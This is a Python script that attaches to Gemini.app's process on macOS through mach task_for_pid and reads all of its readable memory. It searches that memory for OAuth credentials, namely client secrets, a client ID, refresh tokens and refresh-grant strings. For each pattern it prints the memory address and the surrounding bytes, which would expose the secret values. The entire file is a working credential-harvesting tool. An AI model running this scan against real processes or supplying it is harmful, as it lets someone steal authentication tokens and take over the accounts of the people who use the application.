#!/usr/bin/env python3
"""Scan Gemini.app's live memory via mach APIs for OAuth secrets.
Works because task_for_pid is permitted for same-user processes (vmmap/sample prove it).
"""
import ctypes, sys, re

libc = ctypes.CDLL(None, use_errno=True)

# --- mach API bindings ---
libc.mach_task_self.restype = ctypes.c_uint
libc.mach_task_self.argtypes = []
mach_task_self = libc.mach_task_self()

libc.task_for_pid.restype = ctypes.c_int
libc.task_for_pid.argtypes = [ctypes.c_uint, ctypes.c_int, ctypes.POINTER(ctypes.c_uint)]
task = ctypes.c_uint(0)
kr = libc.task_for_pid(mach_task_self, int(sys.argv[1]), ctypes.byref(task))
if kr != 0:
    print(f"task_for_pid failed: {kr}")
    sys.exit(1)
print(f"task port: {task.value:#x}")

libc.mach_vm_region.restype = ctypes.c_int
libc.mach_vm_region.argtypes = [
    ctypes.c_uint,                      # target_task
    ctypes.POINTER(ctypes.c_uint64),   # address (in/out)
    ctypes.POINTER(ctypes.c_uint64),   # size (out)
    ctypes.c_int,                      # flavor
    ctypes.c_void_p,                   # info (out)
    ctypes.POINTER(ctypes.c_uint),     # infoCnt (in/out)
    ctypes.POINTER(ctypes.c_uint),     # object_name (out)
]

libc.mach_vm_read_overwrite.restype = ctypes.c_int
libc.mach_vm_read_overwrite.argtypes = [
    ctypes.c_uint,                      # target_task
    ctypes.c_uint64,                    # address
    ctypes.c_uint64,                    # size
    ctypes.c_uint64,                    # data (buffer ptr)
    ctypes.POINTER(ctypes.c_uint64),    # outsize
]

MACH_VM_REGION_BASIC_INFO_64 = 9
VM_PROT_READ = 0x1
VM_PROT_WRITE = 0x2

# --- enumerate regions ---
regions = []
addr = ctypes.c_uint64(0)
info = ctypes.create_string_buffer(512)
infoCnt = ctypes.c_uint(128)
objName = ctypes.c_uint(0)
region_count = 0
while True:
    size = ctypes.c_uint64(0)
    infoCnt.value = 128
    kr = libc.mach_vm_region(task, ctypes.byref(addr), ctypes.byref(size),
                             MACH_VM_REGION_BASIC_INFO_64, ctypes.cast(info, ctypes.c_void_p),
                             ctypes.byref(infoCnt), ctypes.byref(objName))
    if kr != 0:
        break
    prot = ctypes.c_uint.from_buffer(info, 0).value
    regions.append((addr.value, size.value, prot))
    region_count += 1
    addr.value += size.value

print(f"regions: {region_count}")
readable = [(a, s) for a, s, p in regions if p & VM_PROT_READ and s > 0]
total = sum(s for _, s in readable)
print(f"readable regions: {len(readable)}, total: {total/1024/1024:.0f} MB")

# --- patterns ---
patterns = {
    'GOCSPX': b'GOCSPX',
    'client_secret_eq': b'client_secret=',
    'client_id': b'839509190550-l232s',
    'refresh_token_prefix': b'1//',   # pattern only — scan for the Google refresh-token prefix
    'grant_refresh': b'grant_type=refresh_token',
}
hits = {k: [] for k in patterns}

CHUNK = 4 * 1024 * 1024
scanned = 0
for a, s in readable:
    offset = 0
    while offset < s:
        n = min(CHUNK, s - offset)
        buf = ctypes.create_string_buffer(n)
        out = ctypes.c_uint64(0)
        kr = libc.mach_vm_read_overwrite(task, a + offset, n,
                                         ctypes.cast(buf, ctypes.c_uint64), ctypes.byref(out))
        if kr == 0 and out.value > 0:
            data = buf.raw[:out.value]
            for name, pat in patterns.items():
                start = 0
                while len(hits[name]) < 50:
                    idx = data.find(pat, start)
                    if idx == -1:
                        break
                    abs_addr = a + offset + idx
                    ctx = data[max(0, idx-32):idx+260]
                    hits[name].append((abs_addr, ctx))
                    start = idx + 1
        scanned += n
        offset += n

print(f"scanned {scanned/1024/1024:.0f} MB")
for name, found in hits.items():
    print(f"\n=== {name}: {len(found)} hits ===")
    for abs_addr, ctx in found[:12]:
        # only print printable-ish contexts
        txt = ''.join(chr(b) if 32 <= b < 127 else '.' for b in ctx)
        print(f"  @ {abs_addr:#x}: {txt}")
